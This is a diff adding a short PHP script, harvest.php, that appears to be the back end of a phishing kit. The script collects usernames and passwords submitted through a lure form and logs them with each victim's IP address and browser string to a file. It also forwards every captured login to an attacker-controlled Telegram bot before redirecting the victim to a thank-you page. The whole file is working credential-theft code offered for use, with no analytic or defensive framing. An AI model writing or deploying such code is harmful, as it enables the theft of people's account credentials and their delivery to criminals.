@@ -1,0 +1,17 @@
+<?php
+// harvest.php - receives the lure form, logs it, forwards it.
+require 'config.php';
+
+$user = $_POST['user'] ?? '';
+$pass = $_POST['pass'] ?? '';
+$ip   = $_SERVER['REMOTE_ADDR'];
+$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+$line = date('c') . " | $ip | $user | $pass | $ua\n";
+file_put_contents('victims/log.txt', $line, FILE_APPEND);
+
+// Copy to the thief's chat bot.
+$msg = urlencode("new login: $user / $pass from $ip");
+@file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$bot_chat&text=$msg");
+
+header('Location: /thanks.html');
